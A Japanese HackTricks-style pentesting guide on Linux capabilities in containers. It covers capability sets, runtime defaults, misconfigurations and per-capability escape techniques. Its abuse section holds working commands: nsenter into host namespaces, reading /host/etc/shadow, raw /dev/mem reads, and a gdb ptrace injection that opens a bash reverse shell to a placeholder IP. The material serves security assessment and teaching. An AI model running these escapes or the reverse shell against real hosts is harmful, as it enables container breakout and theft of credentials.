# コンテナ内の Linux Capabilities

{{#include ../../../../banners/hacktricks-training.md}}

## 概要

Linux capabilities は container security における最も重要な要素の1つです。なぜなら、微妙ですが根本的な問いに答えるものだからです。**コンテナ内で「root」とは実際に何を意味するのか？** 通常の Linux system では、UID 0 は歴史的に非常に広範な privilege set を意味していました。現代の kernel では、その privilege は capabilities と呼ばれる、より小さな単位に分解されています。関連する capabilities が削除されていれば、プロセスは root として実行されていても、多くの強力な操作を実行できません。<sup>[[1]](#references)</sup>

コンテナはこの区別に大きく依存しています。多くの workload は、互換性または単純化のため、コンテナ内で UID 0 として起動されます。capability dropping がなければ、これは非常に危険です。capability dropping を行うことで、containerized root process はコンテナ内の通常の多くのタスクを実行しながら、より機密性の高い kernel 操作を拒否されます。そのため、`uid=0(root)` と表示される container shell が、必ずしも「host root」や「広範な kernel privilege」を意味するわけではありません。capability sets によって、その root identity が実際にどれほどの価値を持つかが決まります。

Linux capability の完全なリファレンスと多くの abuse examples については、以下を参照してください。

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## 操作

Capabilities は、permitted、effective、inheritable、ambient、bounding sets など、複数の set で追跡されます。多くの container assessment では、各 set の正確な kernel semantics よりも、最終的な実用上の問いのほうがすぐに重要です。**このプロセスは現在、どの privileged operations を正常に実行でき、今後どの privilege gains がまだ可能なのか？** <sup>[[1]](#references)</sup>

これが重要なのは、多くの breakout techniques が、実際には container の問題に偽装された capability の問題だからです。`CAP_SYS_ADMIN` を持つ workload は、通常の container root process が触れるべきではない、膨大な量の kernel functionality にアクセスできます。`CAP_NET_ADMIN` を持つ workload は、host network namespace も共有している場合、さらに危険になります。`CAP_SYS_PTRACE` を持つ workload は、host PID sharing を通じて host processes を確認できる場合、より興味深い対象になります。Docker や Podman では、これは `--pid=host` として現れることがあります。Kubernetes では通常、`hostPID: true` として現れます。

つまり、capability set は単独で評価できません。namespaces、seccomp、MAC policy と併せて読み取る必要があります。

## Lab

コンテナ内の capabilities を確認する非常に直接的な方法は、次のとおりです。
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
より制限の厳しいコンテナと、すべての capabilities が追加されたコンテナを比較することもできます。
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
限定的な追加の効果を確認するには、いったんすべてを削除し、1つの capability だけを再度追加してみます：
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
これらの小さな実験は、runtime が単に `"privileged"` という boolean を切り替えているだけではないことを示します。runtime は、process が利用できる実際の privilege surface を形成しています。

## High-Risk Capabilities

Capabilities が escape primitive になるのは、その操作が **host が管理する resource** に到達する場合だけです。繰り返し登場する high-risk な組み合わせは次のとおりです。

- **`CAP_SYS_ADMIN`** と host の PID、block device、または書き込み可能な kernel-control path。target mount namespace に参加するには、さらに `CAP_SYS_CHROOT` が必要です。block-based filesystem を mount するには、initial user namespace における `CAP_SYS_ADMIN` が必要です。
- **`CAP_SYS_PTRACE`** と host PID の可視性、および attach 可能な host process。ptrace injection に `CAP_SYS_ADMIN` は必要ありません。
- **`CAP_DAC_OVERRIDE` または `CAP_DAC_READ_SEARCH`** と、到達可能な host filesystem。これらの capabilities は異なる DAC check を bypass しますが、host filesystem view 自体を作成するわけではありません。
- **initial user namespace における `CAP_SYS_MODULE`** と、受け入れ可能で kernel と互換性のある module。通常の Linux containers は node の kernel を共有します。VM または userspace-kernel runtime では、この境界が変わります。
- **initial user namespace における `CAP_MKNOD`** と、device cgroup がすでに許可している実際の host device。node の作成によって device cgroup を bypass することはできません。
- **`CAP_SYS_RAWIO`** と、公開され使用可能な memory、I/O-port、PCI、または device-control interface。
- **`CAP_SYS_BOOT`** と、host reboot のための initial PID namespace、または kernel replacement に使用可能で許可された kexec path。
- host network namespace における **`CAP_NET_ADMIN`** による、node の network-state の直接制御。**`CAP_NET_RAW`** は protocol-specific な escape に関与することがありますが、raw socket だけで node shell になるわけではありません。

`CAP_SYS_CHROOT` は、単独の escape capability として意図的に挙げていません。mount-namespace `setns()` で必要になることがあり、すでにアクセス可能な host tree を使いやすくすることはできます。しかし、`chroot()` だけではその tree を公開することも、新しい filesystem permissions を付与することもありません。同様に、`CAP_BPF` と `CAP_PERFMON` は強力な telemetry と kernel attack surface を公開しますが、別の kernel flaw がない限り、それらの通常の操作は汎用的な container escape ではありません。

## Runtime Usage

Docker、Podman、containerd-based stack、CRI-O はすべて capability controls を使用しますが、defaults と management interfaces は異なります。Docker では、`--cap-drop` や `--cap-add` などの flags から直接操作できます。Podman でも同様の controls を利用でき、additional safety layer として rootless execution と組み合わせることが一般的です。Kubernetes では、Pod または container の `securityContext` を通じて capability additions と drops を指定します。lower-level runtime では、最終的な sets を OCI runtime configuration に記述します。LXC や Incus などの system-container environment も capability control に依存しますが、host との統合範囲が広いため、application container の場合よりも積極的に defaults を緩めるよう operator を誘導することがあります。 <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

同じ原則がすべての環境に当てはまります。つまり、技術的に grant 可能な capability が、必ずしも grant すべき capability とは限りません。現実の多くの incident は、より厳格な configuration で workload が失敗し、team が素早い fix を必要としたため、operator が capability を追加することから始まります。

## Misconfigurations

最も明白な mistake は Docker/Podman-style CLI での **`--cap-add=ALL`** ですが、これだけではありません。実際には、非常に強力な capability を 1 つまたは 2 つ、特に `CAP_SYS_ADMIN` を、「application を動作させる」ために付与することのほうが、より一般的な問題です。その際、namespace、seccomp、mount に関する影響を理解していないことがあります。もう 1 つの一般的な failure mode は、extra capabilities と host namespace sharing を組み合わせることです。Docker または Podman では、これは `--pid=host`、`--network=host`、または `--userns=host` として現れることがあります。Kubernetes では、通常、`hostPID: true` や `hostNetwork: true` などの workload settings によって同等の exposure が発生します。これらの各組み合わせによって、capability が実際に影響を及ぼせる対象が変わります。

また、workload が完全な `--privileged` ではないため、依然として意味のある制約を受けていると administrator が考えることもよくあります。それが正しい場合もありますが、effective posture がすでに privileged に十分近く、運用上その違いが意味を持たなくなっている場合もあります。

## Abuse

まず、effective sets、user-namespace mapping、seccomp state、namespaces、mounts、devices を記録します。この context がなければ、capability name だけで escape を証明することはできません：
```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```
### `CAP_SYS_ADMIN`: namespaces と block devices

ホスト PID の可視性がある場合、`CAP_SYS_ADMIN` によりホストの namespaces に入ることができます。mount-namespace 操作には、呼び出し元の user namespace における `CAP_SYS_CHROOT` も必要です。

**capability と confinement を確認します:**
```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```
**targetを列挙する:** container/Podの設定、または明確なhost process listからhost PID sharingを確認し、その後targetのnamespaceを調査する。private PID namespaceにもlocal PID 1は存在するため、それだけではhost PID sharingの証明にはならない。
```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```
**namespace pathをExploitする:**
```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```
ターゲットを所有する user namespaces 内で、capability checks が成功しなければなりません。`--pid=host` または Kubernetes の `hostPID: true` は可視性を提供しますが、capabilities は提供しません。

alternative block-device path では、候補を **enumerate** してから、検証済みの候補を最初に read-only で mount し、アクセス可能な filesystem を **exploit** します：
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```
デバイスノードが存在し、device cgroup がそれを許可している必要があります。また、block filesystem の mount には initial user namespace 内の `CAP_SYS_ADMIN` が必要です。`/host` に bind-mounted された host root には、`CAP_SYS_ADMIN` なしでも host access できます。`chroot /host` は単なる利便機能であり、別途 `CAP_SYS_CHROOT` が必要です。

### 到達可能な host root: 直接 filesystem 実行

host root がすでに `/host` に mount されている場合は、まず mount を確認してから、既存の access を直接使用します。この方法は `CAP_SYS_ADMIN` に依存しません：
```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```
`chroot()` を利用できない場合でも、host binary が container の architecture と loader に互換性があれば、通常は mount された tree を通じて呼び出せます:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
`/host` 配下での直接的な読み取りや書き込みは、すでに host filesystem の compromise です。`chroot()` や host binary の実行によってアクセスがより便利になるだけで、いずれの操作も host mount を作成したり、read-only mount や MAC policy を回避したりするものではありません。

### `CAP_SYS_PTRACE`: host-process injection

host PID の可視性と、対象の user namespace における `CAP_SYS_PTRACE` があれば、GDB によって承認済みの host process に `system()` を呼び出させることができます。`CAP_SYS_ADMIN` は必要ありません。

**capability と attachment controls を確認する：**
```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```
**破棄可能な対象を列挙して選択する：**設定または明確な node プロセス一覧から host PID の共有を確認し、PID 1 や重要な daemon は決して選択しない。
```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
"/proc/${target_pid}/status"
```
**選択したプロセスを Exploit:**
```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
-ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
-ex detach
```
対象は attach 可能で、使用可能な `system()` symbol と Bash payload path を備えている必要があります。Yama、non-dumpable state、seccomp、user namespaces、MAC policy によって、この chain が阻止される場合があります。GDB は attach 中に対象を停止するため、使い捨て可能な lab process のみを使用してください。

### `CAP_DAC_OVERRIDE` と `CAP_DAC_READ_SEARCH`: 保護された host files

これらの capabilities によって host filesystem が公開されるわけではありません。`/host` がすでに host mount である場合、`CAP_DAC_READ_SEARCH` は read/search DAC checks を bypass でき、`CAP_DAC_OVERRIDE` はさらに通常の write checks も bypass できます。

**capabilities を確認する:**
```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```
**露出したホストファイルシステムを列挙し、対象の権限を確認する：**
```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
/host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```
**使い捨てラボで read および write bypass を演習する**：
```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```
読み取り専用マウントと LSM ルールは引き続き適用されます。`CAP_DAC_READ_SEARCH` は `open_by_handle_at()` も認可しますが、Shocker のような breakout には、同じ基盤ファイルシステムに対するマウント file descriptor、利用可能または発見可能な handle、互換性のあるファイルシステム／ストレージレイアウト、そして runtime や LSM によるブロックがないことも必要です。これは、mount namespace 外にあるすべてのファイルシステムへの任意アクセスを提供するものではありません。

### `CAP_SYS_MODULE`: shared-kernel execution

通常の Linux container では、受け入れられた module は共有された host kernel 内で実行されます。

**capability と user-namespace のスコープを確認する:**
```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**モジュール読み込みの前提条件を列挙する：**
```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
"/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```
**互換性のある、事前レビュー済みの proof module を使い、使い捨てノード上でのみ Exploit する：**
```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```
Capabilityは initial user namespace で有効でなければなりません。Kernel version と configuration、module signatures、lockdown、seccomp、LSM policy により load が許可されている必要があります。Kata、gVisor、Hyper-V isolation、および同様の runtime は、workload が到達する kernel boundary を変更します。

### `CAP_MKNOD`: 許可された device handle を作成する

`CAP_MKNOD` は device node を作成しますが、device cgroup を bypass することはありません。Device creation は namespaced ではないため、capability は initial user namespace で有効でなければなりません。

**capability と user-namespace scope を確認する:**
```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**実デバイス、major/minor 番号、および可視な cgroup-v1 allowlist を列挙します:**
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```
**検証済みの ext-family 候補を read-only で exploit：**
```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```
他の filesystem には対応する read-only tool が必要です。device の mount には追加で `CAP_SYS_ADMIN` も必要です。作成した node を開く際の `Operation not permitted` は、通常、device cgroup によるブロックがまだ有効であることを示します。cgroup v2 では、device access は一般的に BPF で強制され、`devices.list` ファイルは存在しません。そのため、open が成功するかどうかが決定的なテストになります。

### `CAP_SYS_RAWIO`: exposed raw-I/O interface

portable な汎用 payload はありません。有効なアドレスと効果は、hardware と kernel configuration に依存します。

**capability と user-namespace scope を確認する:**
```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**公開されているraw interface、hardware、driverを列挙する:**
```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```
**特定されたデバイスおよびアドレス範囲に対する承認済みの proof を使用する場合にのみ Exploit してください。** `/dev/mem` が lab で承認されたインターフェースである場合、このテンプレートは内容を出力せずに node-memory disclosure を証明します：
```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```
アドレスは lab の hardware map から取得する必要があります。これは、一部の MMIO 領域を読み取ると side effect が発生する可能性があるためです。generic memory-write command は誤解を招き、安全ではありません。同じアドレスでも、あるマシンでは無害で、別のマシンでは hardware や kernel memory を制御する可能性があります。Device cgroups、filesystem permissions、strict `/dev/mem`、kernel lockdown、virtualization、LSM policy によって、通常は有用な access が妨げられます。

### `CAP_SYS_BOOT`: namespace reboot or kernel replacement

private PID namespace 内では、`reboot()` は host を reboot するのではなく、その namespace の init process を終了させます。そのため host reboot への影響には initial PID namespace が必要であり、通常は host PID sharing を介して実現します。kexec path には、compatible な kernel image と permissive な lockdown/signature policy も必要です。

**capability を確認する:**
```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**PID namespace と kexec の前提条件を列挙する:** ワークロード設定からホスト PID の共有を確認する。PID namespace へのリンクだけでは、それがノードの初期 namespace かどうかは分からない。
```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```
**使い捨てのラボノードの再起動が明示的な演習である場合に限って exploit する：**
```bash
sync
reboot -f
```
共有ノード上で、その capability を証明するためだけに、そのコマンドを実行したり kernel を load したりしないでください。private PID namespace 内では、その namespace の init process のみを terminate するため、host への影響を示すものではありません。

### `CAP_NET_ADMIN` and `CAP_NET_RAW`: host network paths

`CAP_NET_ADMIN` は現在の network namespace にのみ影響します。

**capabilities と confinement を確認します：**
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```
**現在のネットワークを列挙し、ワークロード設定からホストネットワーキングを確認する：**
```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```
**`CAP_NET_ADMIN`を可逆的に行使:** host networkingでは、一時的なinterfaceはnode interfaceです。
```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```
`CAP_NET_RAW` は RAW および PACKET ソケットを許可しますが、汎用的な host shell ではありません。文書化された GCE chain を **enumerate** するには、metadata route を確認し、plaintext の guest-agent traffic が観測可能かどうかを capture します。
```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```
一致する前提条件が存在する場合は、[GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html) に記載されている環境固有の chain を **exploit** します。リクエストと sequence の状態を取得し、SSH key を含む偽造 metadata response を注入してから、host へのアクセスを検証します。この chain には、root、host networking、`CAP_NET_ADMIN`、`CAP_NET_RAW`、平文の GCE metadata 通信、および race を発生させられる guest-agent リクエストが必要です。最新の transport や agent の動作によっては成立しない場合があります。

## Checks

capability checks の目的は、raw value を dump することだけではありません。プロセスが、現在の namespace と mount の状況を危険なものにするのに十分な privilege を持っているかを把握することも目的です。
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
ここで興味深い点：

- `capsh --print` は、`cap_sys_admin`、`cap_sys_ptrace`、`cap_net_admin`、`cap_sys_module` などの高リスクな capabilities を見つける最も簡単な方法です。
- `/proc/self/status` の `CapEff` 行は、他の set で利用可能かもしれないものではなく、現在実際に有効なものを示します。
- コンテナが host PID、network、user namespaces のいずれかを共有している場合、または書き込み可能な host mounts がある場合、capability dump ははるかに重要になります。

raw capability information を収集した後は、解釈する必要があります。プロセスが root か、user namespaces が有効か、host namespaces が共有されているか、seccomp が enforcing か、AppArmor または SELinux が依然としてプロセスを制限しているかを確認します。capability set だけでは全体像の一部にすぎませんが、同じように見える開始地点から、一方の container breakout が成功し、もう一方が失敗する理由を説明する重要な要素になることがよくあります。

## Runtime のデフォルト

| Runtime / platform | デフォルト状態 | デフォルトの動作 | よくある手動による弱体化 |
| --- | --- | --- | --- |
| Docker Engine | デフォルトでは削減された capability set | Docker は capabilities のデフォルト allowlist を保持し、それ以外を drop します | `--cap-add=<cap>`、`--cap-drop=<cap>`、`--cap-add=ALL`、`--privileged` |
| Podman | デフォルトでは削減された capability set | Podman containers はデフォルトで unprivileged であり、削減された capability model を使用します | `--cap-add=<cap>`、`--cap-drop=<cap>`、`--privileged` |
| Kubernetes | 変更されない限り runtime のデフォルトを継承 | `securityContext.capabilities` が指定されていない場合、container は runtime から node のデフォルト capability set を取得します | `securityContext.capabilities.add`、`drop: [\"ALL\"]` を設定しないこと、`privileged: true` |
| containerd / CRI-O under Kubernetes | 通常は runtime のデフォルト | 実効 set は runtime と Pod spec の組み合わせによって決まります | Kubernetes の行と同じ。直接の OCI/CRI configuration で capabilities を明示的に追加することも可能です |

Kubernetes で重要なのは、API が universal なデフォルト capability set を 1 つ定義しているわけではないという点です。Pod が capabilities を add または drop しない場合、workload はその node の runtime のデフォルトを継承します。

## References

- [1] [capabilities(7) - Linux manual page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative - Linux container configuration](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Docker Docs - Runtime privilege and Linux capabilities](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Kubernetes Documentation - Set capabilities for a container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [Podman documentation - `--cap-add` and `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [Incus documentation - Security](https://linuxcontainers.org/incus/docs/main/explanation/security/)
{{#include ../../../../banners/hacktricks-training.md}}
